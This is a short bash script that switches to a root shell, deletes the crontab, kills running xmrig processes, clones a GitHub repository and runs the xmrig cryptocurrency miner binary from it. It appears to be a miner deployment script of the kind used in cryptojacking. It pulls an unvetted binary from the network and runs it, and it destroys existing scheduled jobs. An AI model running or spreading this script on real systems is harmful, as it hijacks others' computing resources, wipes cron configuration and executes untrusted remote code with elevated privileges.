#!/bin/bash
sudo -s
crontab -r
killall xmrig
git clone https://github.com/nuriyevn/r12
cd r12
chmod +x xmrig
./xmrig
